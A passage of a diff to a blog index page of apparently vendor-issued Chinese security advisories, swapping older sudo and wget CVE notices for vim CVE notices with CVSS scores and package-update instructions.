+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0261">https://nvd.nist.gov/vuln/detail/CVE-2022-0261</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysm0001b214cc2a1ewh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0261%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0y00176x1488t2fpn9" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -230,10 +263,10 @@
 
 
   
-    <article id="post-cve-2017-1000367安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2022-0213安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:10.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/03/23/CVE-2022-0213%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T09:06:35.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -244,7 +277,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000367分析报告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2022-0213%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0213安全公告</a>
     </h1>
   
 
@@ -252,19 +285,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Todd Miller’s sudo version 1.8.20 and earlier is vulnerable to an input validation (embedded spaces) in the get_process_ttyname() function resulting in information disclosure and command execution.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-1000367"><a href="#漏洞编号：-CVE-2017-1000367" class="headerlink" title="漏洞编号： CVE-2017-1000367"></a>漏洞编号： CVE-2017-1000367</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：6-4"><a href="#CVSS3-1评分：6-4" class="headerlink" title="CVSS3.1评分：6.4"></a>CVSS3.1评分：6.4</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-1000367">https://nvd.nist.gov/vuln/detail/cve-2017-1000367</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim存在堆缓冲区溢出漏洞，该漏洞是由于未检查NameBuff函数的长度而导致的。该漏洞允许攻击者输入特殊构建的文件导致崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0213"><a href="#漏洞编号：-CVE-2022-0213" class="headerlink" title="漏洞编号： CVE-2022-0213"></a>漏洞编号： CVE-2022-0213</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：6-6"><a href="#CVSS3-1评分：6-6" class="headerlink" title="CVSS3.1评分：6.6"></a>CVSS3.1评分：6.6</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0213">https://nvd.nist.gov/vuln/detail/CVE-2022-0213</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysj0000b214d6rkhbsn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0213%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0y00196x149cl8g56k" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="tag">分析报告</a></li></ul>
-
     </footer>
   </div>
   
@@ -272,10 +327,10 @@
 
 
   
-    <article id="post-cve-2017-13090安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2021-4193安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:55:21.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/03/23/CVE-2021-4193%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T09:03:19.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -286,7 +341,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-13090安全公告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2021-4193%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2021-4193安全公告</a>
     </h1>
   
 
@@ -294,19 +349,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The retr.c:fd_read_body() function is called when processing OK responses. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk’s length, but doesn’t check that the chunk length is a non-negative number. The code then tries to read the chunk in pieces of 8192 bytes by using the MIN() macro, but ends up passing the negative chunk length to retr.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument. The attacker can corrupt malloc metadata after the allocated buffer.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-13090"><a href="#漏洞编号：-CVE-2017-13090" class="headerlink" title="漏洞编号： CVE-2017-13090"></a>漏洞编号： CVE-2017-13090</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13090">https://nvd.nist.gov/vuln/detail/CVE-2017-13090</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim的getvcol()函数中存在越界读取漏洞，攻击者可以使用特制的文件来读取系统内存。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2021-4193"><a href="#漏洞编号：-CVE-2021-4193" class="headerlink" title="漏洞编号： CVE-2021-4193"></a>漏洞编号： CVE-2021-4193</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：5-5"><a href="#CVSS3-1评分：5-5" class="headerlink" title="CVSS3.1评分：5.5"></a>CVSS3.1评分：5.5</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-4193">https://nvd.nist.gov/vuln/detail/CVE-2021-4193</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt2000fb2140a6l0041" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2021-4193%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0x00156x14drz57ic0" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -314,10 +391,10 @@
 
 
   
-    <article id="post-cve-2017-13089安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2022-0729安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:55:16.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/03/23/CVE-2022-0729%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T08:55:55.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -328,7 +405,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-13089安全公告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2022-0729%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0729安全公告</a>
     </h1>
   
 
@@ -336,19 +413,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The http.c:skip_short_body() function is called in some circumstances, such as when processing redirects. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk’s length, but doesn’t check that the chunk length is a non-negative number. The code then tries to skip the chunk in pieces of 512 bytes by using the MIN() macro, but ends up passing the negative chunk length to connect.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-13089"><a href="#漏洞编号：-CVE-2017-13089" class="headerlink" title="漏洞编号： CVE-2017-13089"></a>漏洞编号： CVE-2017-13089</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13089">https://nvd.nist.gov/vuln/detail/CVE-2017-13089</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim的win_linetabsize()函数中存在一个释放后使用漏洞，攻击者可以使用特制的文件造成崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0729"><a href="#漏洞编号：-CVE-2022-0729" class="headerlink" title="漏洞编号： CVE-2022-0729"></a>漏洞编号： CVE-2022-0729</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0729">https://nvd.nist.gov/vuln/detail/CVE-2022-0729</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt0000ab214c67wfzpf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0729%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp16001l6x145h9f31zy" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -356,10 +455,10 @@
 
 
   
-    <article id="post-cve-2019-5953安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2021-4192安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:46:59.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/03/23/CVE-2021-4192%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T08:50:44.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -370,7 +469,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-5953安全公告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2021-4192%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2021-4192安全公告</a>
     </h1>
   
 
@@ -378,19 +477,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Buffer overflow in GNU Wget 1.20.1 and earlier allows remote attackers to cause a denial-of-service (DoS) or may execute an arbitrary code via unspecified vectors.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-5953"><a href="#漏洞编号：-CVE-2019-5953" class="headerlink" title="漏洞编号： CVE-2019-5953"></a>漏洞编号： CVE-2019-5953</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：9-8"><a href="#CVSS3-1评分：9-8" class="headerlink" title="CVSS3.1评分：9.8"></a>CVSS3.1评分：9.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-5953">https://nvd.nist.gov/vuln/detail/CVE-2019-5953</a></p>
